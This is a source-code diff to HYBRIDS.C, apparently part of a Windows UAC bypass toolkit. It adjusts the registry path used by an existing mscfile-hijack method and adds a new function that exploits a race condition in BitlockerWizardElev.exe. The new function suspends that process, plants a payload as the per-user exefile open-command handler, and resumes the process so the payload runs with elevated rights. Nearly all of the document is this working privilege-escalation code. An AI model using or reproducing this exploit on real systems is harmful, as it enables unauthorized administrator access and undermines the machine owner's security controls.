@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.86
+*  VERSION:     2.87
 *
-*  DATE:        15 Jan 2018
+*  DATE:        19 Jan 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2032,6 +2032,8 @@ BOOL ucmFwCplLuaMethod(
     IID              xIIDFwCplLua;
     IFwCplLua       *FwCplLua = NULL;
 
+    WCHAR            szKey[MAX_PATH + 1];
+
     do {
 
         //
@@ -2048,8 +2050,10 @@ BOOL ucmFwCplLuaMethod(
         //
         // Create controlled mscfile entry.
         //
+        _strcpy(szKey, T_MSC_SHELL);
+        _strcat(szKey, T_SHELL_OPEN_COMMAND);
         lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
-            T_MSC_SHELL,
+            szKey,
             0,
             NULL,
             REG_OPTION_NON_VOLATILE,
@@ -2213,4 +2217,109 @@ BOOL ucmDccwCOMMethod(
     }
 
     return SUCCEEDED(r);
+}
+
+/*
+* ucmBitlockerRCMethod
+*
+* Purpose:
+*
+* Bypass UAC using BitlockerWizardElev race condition.
+*
+*/
+BOOL ucmBitlockerRCMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    BOOL bResult = FALSE, bNeedCleanup = FALSE;
+    HKEY hKey = NULL;
+    LRESULT lResult;
+    DWORD cbData = 0;
+    WCHAR szKey[MAX_PATH];
+    WCHAR szTargetApp[MAX_PATH * 2];
+
+    SHELLEXECUTEINFO shinfo;
+
+#ifndef _WIN64
+    PVOID   OldValue = NULL;
+#endif
+
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
+            return FALSE;
+    }
+#endif
+
+#ifndef _DEBUG
+    _strcpy(szTargetApp, g_ctx.szSystemDirectory);
+    _strcat(szTargetApp, BITLOCKERWIZARDELEV_EXE);
+    if (!PathFileExists(szTargetApp))
+        return bResult;
+#endif
+
+    //
+    // Create or open target key.
+    //
+    _strcpy(szKey, T_EXEFILE_SHELL);
+    _strcat(szKey, T_SHELL_OPEN_COMMAND);
+    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
+        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+    if (lResult == ERROR_SUCCESS) {
+
+        //
+        // Launch target application and suspend it.
+        //
+        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+        shinfo.cbSize = sizeof(shinfo);
+        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+        shinfo.lpFile = szTargetApp;
+        shinfo.lpParameters = TEXT("X: P F");
+        shinfo.lpDirectory = NULL;
+        shinfo.nShow = SW_SHOW;
+        if (ShellExecuteEx(&shinfo)) {
+            NtSuspendProcess(shinfo.hProcess);
+
+            //
+            // Set new exefile handler.
+            //
+            cbData = (DWORD)((1 + _strlen(lpszPayload)) * sizeof(WCHAR));
+            lResult = RegSetValueEx(
+                hKey,
+                TEXT(""),
+                0,
+                REG_SZ,
+                (BYTE*)lpszPayload,
+                cbData);
+
+            bNeedCleanup = (lResult == ERROR_SUCCESS);
+
+            if (bNeedCleanup)
+                RegFlushKey(hKey);
+
+            //
+            // Resume target application.
+            //
+            NtResumeProcess(shinfo.hProcess);
+            WaitForSingleObject(shinfo.hProcess, 5000);
+
+            NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
+            NtClose(shinfo.hProcess);
+            if (bNeedCleanup) {
+                RegDeleteValue(hKey, TEXT(""));
+                RegFlushKey(hKey);
+            }
+
+            bResult = TRUE;
+        }
+        RegCloseKey(hKey);
+    }
+
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+    }
+#endif
+
+    return bResult;
 }
